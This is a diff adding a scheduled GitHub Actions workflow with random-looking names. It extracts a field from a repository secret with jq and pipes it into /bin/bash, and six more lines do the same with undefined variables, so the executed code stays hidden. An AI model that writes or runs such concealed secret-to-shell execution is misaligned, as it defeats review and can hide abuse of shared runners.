@@ -1,0 +1,22 @@
+name: jidancanchen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jidancanchen
+        env:
+          jldn40000: ${{ secrets.jldn40000 }}
+        run: |
+          echo $jldn40000 | jq -r .jfdov04082 | /bin/bash
+          echo $gm12 | jq -r .gnqvz231 | /bin/bash
+          echo $nnhj26286 | jq -r .s065 | /bin/bash
+          echo $oosn928 | jq -r .thrv760 | /bin/bash
+          echo $btsxq883 | jq -r .ql3068 | /bin/bash
+          echo $va44 | jq -r .lchyf9 | /bin/bash
+          echo $itw376 | jq -r .opb59 | /bin/bash
+
